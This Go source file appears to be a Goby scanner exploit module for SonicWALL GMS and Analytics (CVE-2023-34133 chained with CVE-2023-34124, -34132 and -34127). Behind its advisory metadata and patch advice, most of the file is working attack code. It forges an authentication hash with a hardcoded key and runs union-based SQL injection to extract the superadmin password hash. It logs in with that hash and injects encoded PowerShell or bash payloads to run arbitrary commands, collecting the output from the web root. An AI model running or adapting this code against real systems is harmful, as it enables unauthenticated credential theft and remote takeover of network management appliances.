package exploits

import (
	"crypto/hmac"
	"crypto/md5"
	"crypto/sha1"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "SonicWALL Analytics and GMS tenant SQL injection vulnerability (CVE-2023-34133)",
    "Description": "<p>SonicWALL Analytics and SonicWALL GMS are both products of SonicWALL Corporation of the United States. SonicWALL Analytics is a high-performance management and reporting engine for the network. SonicWALL GMS is a global management system. Provides organizations, distributed enterprises, and service providers with powerful and intuitive solutions to centrally manage and rapidly deploy SonicWall firewall, anti-spam, backup and recovery, and secure remote access solutions.</p><p>There is a SQL injection vulnerability in SonicWall GMS and Analytics. CVE-2023-34133, combined with CVE-2023-34124, allows an attacker to extract sensitive information from the application database without authentication. Coupled with CVE-2023-34132 and CVE-2023-34127, an unauthenticated attacker can extract the administrator account and password hash from the application database, complete authentication through the user password hash, and finally bypass the system Defense restrictions inject commands into targets. This issue affects GMS: 9.3.2-SP1 and earlier. Analytics: 2.5.0.4-R7 and earlier.</p>",
    "Product": "SONICWALL-Analytics",
    "Homepage": "https://www.sonicwall.com/",
    "DisclosureDate": "2023-12-20",
    "PostTime": "2024-01-17",
    "Author": "zou",
    "FofaQuery": "header=\"/sgms\" || banner=\"/sgms\" || title=\"SonicWall Global Management System\" || title=\"SonicWALL GMS Login\" || cert=\"CommonName: SonicWall Universal Management Suite\"",
    "GobyQuery": "header=\"/sgms\" || banner=\"/sgms\" || title=\"SonicWall Global Management System\" || title=\"SonicWALL GMS Login\" || cert=\"CommonName: SonicWall Universal Management Suite\"",
    "Level": "3",
    "Impact": "<p>There is a SQL injection vulnerability in SonicWall GMS and Analytics. CVE-2023-34133, combined with CVE-2023-34124, allows an attacker to extract sensitive information from the application database without authentication. Coupled with CVE-2023-34132 and CVE-2023-34127, an unauthenticated attacker can extract the administrator account and password hash from the application database, complete authentication through the user password hash, and finally bypass the system Defense restrictions inject commands into targets. This issue affects GMS: 9.3.2-SP1 and earlier. Analytics: 2.5.0.4-R7 and earlier.</p>",
    "Recommendation": "<p>1. The manufacturer has released patches and repair plans, please update in time: <a href=\"https://www.sonicwall.com/support/knowledge-base/urgent-security-notice-sonicwall-gms-analytics-impacted-by-suite-of-vulnerabilities/230710150218060/\">https://www.sonicwall.com/support/knowledge-base/urgent-security-notice-sonicwall-gms-analytics-impacted-by-suite-of- vulnerabilities/230710150218060/</a></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. Unless necessary, it is prohibited to access the system from the public network.</p>",
    "References": [
        "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2023/CVE-2023-34124.yaml",
        "https://github.com/getdrive/PoC/blob/main/2023/Sonicwall_Shell_Injection/sonicwall_shell_injection_cve_2023_34124.rb"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint,cmd",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select user()",
            "show": "attackType=sql"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2023-34133",
        "CVE-2023-34124",
        "CVE-2023-34132",
        "CVE-2023-34127"
    ],
    "CNNVD": [
        "CNNVD-202307-1179",
        "CNNVD-202307-1196",
        "CNNVD-202307-1182",
        "CNNVD-202307-1192"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "SonicWALL  Analytics 和 GMS tenant SQL注入漏洞（CVE-2023-34133）",
            "Product": "SONICWALL-Analytics",
            "Description": "<p>SonicWALL&nbsp; Analytics 和 SonicWALL GMS 都是美国 SonicWALL 公司的产品。SonicWALL&nbsp; Analytics 是一款适用于网络的高性能管理和报告引擎。SonicWALL GMS 是一个全球管理系统。为组织、分布式企业和服务提供商提供强大而直观的解决方案，以集中管理和快速部署 SonicWall 防火墙、反垃圾邮件、备份和恢复以及安全远程访问解决方案。</p><p>SonicWall GMS 和 Analytics 中存在SQL注入漏洞 CVE-2023-34133 ，配合 CVE-2023-34124，攻击者可以利用该漏洞在未经身份验证的情况下从应用程序数据库中提取敏感信息。再配合 CVE-2023-34132、CVE-2023-34127，使得未经身份验证的攻击者能够从应用程序数据库中提取管理员账户和密码哈希，并通过用户密码哈希完成认证，最后绕过系统防御限制将命令注入到目标中。此问题影响 GMS： 9.3.2-SP1 及之前版本。Analytics：2.5.0.4-R7 及更早版本。</p>",
            "Recommendation": "<p>1、厂商已发布补丁和修复方案，请及时更新：<a href=\"https://www.sonicwall.com/support/knowledge-base/urgent-security-notice-sonicwall-gms-analytics-impacted-by-suite-of-vulnerabilities/230710150218060/\" target=\"_blank\">https://www.sonicwall.com/support/knowledge-base/urgent-security-notice-sonicwall-gms-analytics-impacted-by-suite-of-vulnerabilities/230710150218060/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>SonicWall GMS 和 Analytics 中存在SQL注入漏洞 CVE-2023-34133 ，配合 CVE-2023-34124，攻击者可以利用该漏洞在未经身份验证的情况下从应用程序数据库中提取敏感信息。再配合 CVE-2023-34132、CVE-2023-34127，使得未经身份验证的攻击者能够从应用程序数据库中提取管理员账户和密码哈希，并通过用户密码哈希完成认证，最后绕过系统防御限制将命令注入到目标中。此问题影响 GMS： 9.3.2-SP1 及之前版本。Analytics：2.5.0.4-R7 及更早版本。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "SonicWALL Analytics and GMS tenant SQL injection vulnerability (CVE-2023-34133)",
            "Product": "SONICWALL-Analytics",
            "Description": "<p>SonicWALL Analytics and SonicWALL GMS are both products of SonicWALL Corporation of the United States. SonicWALL Analytics is a high-performance management and reporting engine for the network. SonicWALL GMS is a global management system. Provides organizations, distributed enterprises, and service providers with powerful and intuitive solutions to centrally manage and rapidly deploy SonicWall firewall, anti-spam, backup and recovery, and secure remote access solutions.</p><p>There is a SQL injection vulnerability in SonicWall GMS and Analytics. CVE-2023-34133, combined with CVE-2023-34124, allows an attacker to extract sensitive information from the application database without authentication. Coupled with CVE-2023-34132 and CVE-2023-34127, an unauthenticated attacker can extract the administrator account and password hash from the application database, complete authentication through the user password hash, and finally bypass the system Defense restrictions inject commands into targets. This issue affects GMS: 9.3.2-SP1 and earlier. Analytics: 2.5.0.4-R7 and earlier.</p>",
            "Recommendation": "<p>1. The manufacturer has released patches and repair plans, please update in time: <a href=\"https://www.sonicwall.com/support/knowledge-base/urgent-security-notice-sonicwall-gms-analytics-impacted-by-suite-of- vulnerabilities/230710150218060/\" target=\"_blank\">https://www.sonicwall.com/support/knowledge-base/urgent-security-notice-sonicwall-gms-analytics-impacted-by-suite-of- vulnerabilities/230710150218060/</a></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. Unless necessary, it is prohibited to access the system from the public network.</p>",
            "Impact": "<p>There is a SQL injection vulnerability in SonicWall GMS and Analytics. CVE-2023-34133, combined with CVE-2023-34124, allows an attacker to extract sensitive information from the application database without authentication. Coupled with CVE-2023-34132 and CVE-2023-34127, an unauthenticated attacker can extract the administrator account and password hash from the application database, complete authentication through the user password hash, and finally bypass the system Defense restrictions inject commands into targets. This issue affects GMS: 9.3.2-SP1 and earlier. Analytics: 2.5.0.4-R7 and earlier.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10907"
}`
	sendSqlRequest3rewr43 := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		payload := fmt.Sprintf("' union select (select ID from SGMSDB.DOMAINS limit 1), 22, 33, 44, 55, 66, (%s), 88, 99, '", sql)
		mac := hmac.New(sha1.New, []byte("?~!@#$%^^()"))
		mac.Write([]byte(payload))
		decodedUserHex, _ := hex.DecodeString(hex.EncodeToString(mac.Sum(nil)))
		payloadRequestConfig := httpclient.NewGetRequestConfig("/ws/msw/tenant/" + url.PathEscape(payload))
		payloadRequestConfig.FollowRedirect = false
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.Header.Store("Auth", fmt.Sprintf("{\"user\": \"system\", \"hash\": \"%s\"}", base64.StdEncoding.EncodeToString(decodedUserHex)))
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}

	sendPostRequest5fdet4t4 := func(hostInfo *httpclient.FixUrl, cookie string, data string) (*httpclient.HttpResponse, error) {
		postRequestConfig := httpclient.NewPostRequestConfig("/appliance/applianceMainPage")
		postRequestConfig.FollowRedirect = false
		postRequestConfig.VerifyTls = false
		postRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		postRequestConfig.Header.Store("Cookie", cookie)
		postRequestConfig.Data = data
		return httpclient.DoHttpRequest(hostInfo, postRequestConfig)
	}

	sendShellRequest9yy5uyu := func(hostInfo *httpclient.FixUrl, commandPayload string, searchFolder string) (string, error) {
		var namePasswdHash, securityToken, jessionID, serverToken, newJessionID []string
		result, err := sendSqlRequest3rewr43(hostInfo, "select concat(id, ':', password) from sgmsdb.users where active = '1' order by issuperadmin desc limit 1 offset 0")
		if err == nil && result != nil && strings.Contains(result.Utf8Html, `"alias":`) {
			namePasswdHash = regexp.MustCompile(`"alias":"([^:]+):([^"]+)"`).FindStringSubmatch(result.Utf8Html)
			securityToken = regexp.MustCompile(`security_token=([^;]+);`).FindStringSubmatch(result.Header.Get("Set-Cookie"))
		} else if err != nil {
			return "", err
		} else {
			return "", errors.New("漏洞利用失败")
		}

		loginRequestConfig := httpclient.NewGetRequestConfig("/appliance/login")
		loginRequestConfig.FollowRedirect = false
		loginRequestConfig.VerifyTls = false
		loginRequestConfig.Header.Store("Cookie", securityToken[0])
		loginresp, err := httpclient.DoHttpRequest(hostInfo, loginRequestConfig)
		if err == nil && loginresp.StatusCode == 200 && strings.Contains(loginresp.HeaderString.String(), "JSESSIONID=") && strings.Contains(loginresp.Utf8Html, "getPwdHash") {
			jessionID = regexp.MustCompile(`JSESSIONID=([^;]+);`).FindStringSubmatch(loginresp.Header.Get("Set-Cookie"))
			serverToken = regexp.MustCompile(`getPwdHash.*,'([0-9]+)'`).FindStringSubmatch(loginresp.Utf8Html)
		} else if err != nil {
			return "", err
		} else {
			return "", errors.New("漏洞利用失败")
		}

		hash := md5.New()
		hash.Write([]byte(serverToken[1] + namePasswdHash[2]))
		authResp, err := sendPostRequest5fdet4t4(hostInfo, securityToken[0]+jessionID[0], "action=login&skipSessionCheck=0&needPwdChange=0&clientHash="+hex.EncodeToString(hash.Sum(nil))+"&password="+namePasswdHash[2]+"&applianceUser="+namePasswdHash[1]+"&appliancePassword=Nice%20Try&ctlTimezoneOffset=0")
		if err == nil && authResp.StatusCode == 200 && strings.Contains(loginresp.HeaderString.String(), "JSESSIONID=") {
			newJessionID = regexp.MustCompile(`JSESSIONID=([^;]+);`).FindStringSubmatch(authResp.Header.Get("Set-Cookie"))
		} else if err != nil {
			return "", err
		} else {
			return "", errors.New("漏洞利用失败")
		}

		if strings.Contains(searchFolder, `\GMSVP`) {
			var commandStrings []string
			for _, oneChar := range []byte("cmd /c " + strings.ReplaceAll(strings.ReplaceAll(commandPayload, "'", "''"), "&", "\"&\"")) {
				commandStrings = append(commandStrings, strconv.Itoa(int(oneChar)))
			}
			commandPayload = "appliance.jar%7cpowershell+IEX+([System.Text.Encoding]::UTF8.GetString([byte[]]@(" + strings.Join(commandStrings, ",") + ")))%7c+echo+"
		} else {
			temFileName := goutils.RandomHexString(4)
			commandPayload = "appliance.jar%3Bbash+-c+PLUS%3d\\$\\(echo\\+-e\\+begin-base64\\+755\\+a\\\\\\\\nKwee\\\\\\\\n\\%3d\\%3d\\%3d\\%3d\\+\\|\\+uudecode\\+-o-\\)\\%3becho\\+-e\\+begin-base64\\+755\\+/tmp/." + temFileName + "\\\\\\\\n" + strings.Replace(base64.StdEncoding.EncodeToString([]byte(commandPayload)), "+", "${PLUS}", -1) + "\\\\\\\\n\\%3d\\%3d\\%3d\\%3d\\+|+uudecode+%3b/tmp/." + temFileName + "%3brm+/tmp/." + temFileName + "%3becho+"
		}

		rceResp, err := sendPostRequest5fdet4t4(hostInfo, securityToken[0]+newJessionID[0], "num=3232150&action=file_system&task=search&item=application_log&criteria=*&width=500&searchFolder="+url.QueryEscape(searchFolder)+"&searchFilter="+commandPayload)
		if err == nil && rceResp.StatusCode == 200 {
			return rceResp.Utf8Html, nil
		} else if err != nil {
			return "", err
		} else {
			return "", errors.New("漏洞利用失败")
		}
	}

	commandEchoing35fgdghd := func(hostInfo *httpclient.FixUrl, command string) (string, error) {
		var rootPath, searchFolder, delFileCommand, filePath string
		filename := goutils.RandomHexString(4) + ".txt"
		if result, err := sendSqlRequest3rewr43(hostInfo, "select @@basedir"); result != nil && err == nil && len(regexp.MustCompile(`"alias":"([^"]+)"`).FindStringSubmatch(result.Utf8Html)[1]) > 0 {
			path := regexp.MustCompile(`"alias":"([^"]+)"`).FindStringSubmatch(result.Utf8Html)[1]
			if strings.Contains(path, `\\GMSVP`) || strings.Contains(path, `\\mysql`) || strings.Contains(path, `\\MySQL`) {
				if len(regexp.MustCompile(`.*GMSVP`).FindStringSubmatch(path)) > 0 {
					rootPath = strings.Replace(regexp.MustCompile(`.*GMSVP`).FindStringSubmatch(path)[0], `\\`, `\`, -1)
				} else {
					rootPath = `C:\GMSVP`
				}
				searchFolder = strings.Replace(rootPath, `\`, `\\`, -1) + `\\etc\\`
				filePath = rootPath + `\Tomcat\webapps\ROOT\` + filename
				delFileCommand = "del " + filePath
			} else if strings.Contains(path, `/GMSVP`) || strings.Contains(path, `/mysql`) || strings.Contains(path, `/MySQL`) {
				if len(regexp.MustCompile(`.*/GMSVP`).FindStringSubmatch(path)) > 0 {
					rootPath = regexp.MustCompile(`.*/GMSVP`).FindStringSubmatch(path)[0]
				} else {
					rootPath = "/opt/GMSVP"
				}
				searchFolder = rootPath + "/etc/"
				filePath = rootPath + "/Tomcat/webapps/ROOT/" + filename
				delFileCommand = "rm " + filePath
			}
		} else if err != nil {
			return "", err
		} else {
			return "", errors.New("漏洞利用失败")
		}

		resp, err := sendShellRequest9yy5uyu(hostInfo, command+" > "+filePath, searchFolder)
		if err == nil && (strings.Contains(resp, "No file available in the selected folder") || strings.Contains(resp, "Operation not supported.")) {
			getResultRequestConfig := httpclient.NewGetRequestConfig("/" + filename)
			getResultRequestConfig.FollowRedirect = false
			getResultRequestConfig.VerifyTls = false
			if getResultresp, err := httpclient.DoHttpRequest(hostInfo, getResultRequestConfig); err == nil && getResultresp.StatusCode == 200 {
				_, _ = sendShellRequest9yy5uyu(hostInfo, delFileCommand, searchFolder)
				return getResultresp.Utf8Html, nil
			} else if err != nil {
				return "", err
			} else {
				return "", errors.New("漏洞利用失败")
			}
		} else if err != nil {
			return "", err
		}
		return "", errors.New("漏洞利用失败")

	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(3)
			h := md5.New()
			h.Write([]byte(checkStr))
			if resp, _ := sendSqlRequest3rewr43(hostInfo, `md5('`+checkStr+`')`); resp != nil && strings.Contains(resp.Utf8Html, hex.EncodeToString(h.Sum(nil))) {
				ss.VulURL = hostInfo.FixedHostInfo + resp.Request.URL.Path
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "sql" {
				if result, err := sendSqlRequest3rewr43(expResult.HostInfo, goutils.B2S(ss.Params["sql"])); result != nil && len(regexp.MustCompile(`"alias":"([^"]+)"`).FindStringSubmatch(result.Utf8Html)[1]) > 1 {
					expResult.Success = true
					expResult.Output = regexp.MustCompile(`"alias":"([^"]+)"`).FindStringSubmatch(result.Utf8Html)[1]
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "sqlPoint" {
				checkStr := goutils.RandomHexString(16)
				h := md5.New()
				h.Write([]byte(checkStr))
				payload := fmt.Sprintf("' union select (select ID from SGMSDB.DOMAINS limit 1), 22, 33, 44, 55, 66, (%s), 88, 99, '", `md5('`+checkStr+`')`)
				mac := hmac.New(sha1.New, []byte("?~!@#$%^^()"))
				mac.Write([]byte(payload))
				decodedUserHex, _ := hex.DecodeString(hex.EncodeToString(mac.Sum(nil)))
				hashEnBase64 := base64.StdEncoding.EncodeToString(decodedUserHex)
				if result, err := sendSqlRequest3rewr43(expResult.HostInfo, `md5('`+checkStr+`')`); result != nil && err == nil && strings.Contains(result.Utf8Html, hex.EncodeToString(h.Sum(nil))) {
					expResult.Success = true
					expResult.Output = "GET /ws/msw/tenant/" + url.PathEscape(payload) + " HTTP/1.1\n" +
						"Host:" + expResult.HostInfo.String() + "\n" +
						"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36\n" +
						"Auth: {\"user\": \"system\", \"hash\": \"" + hashEnBase64 + "\"}\n" +
						"Connection: close"
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "cmd" {
				resp, err := commandEchoing35fgdghd(expResult.HostInfo, goutils.B2S(ss.Params["cmd"]))
				if err == nil && resp != "" {
					expResult.Success = true
					expResult.Output = resp
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
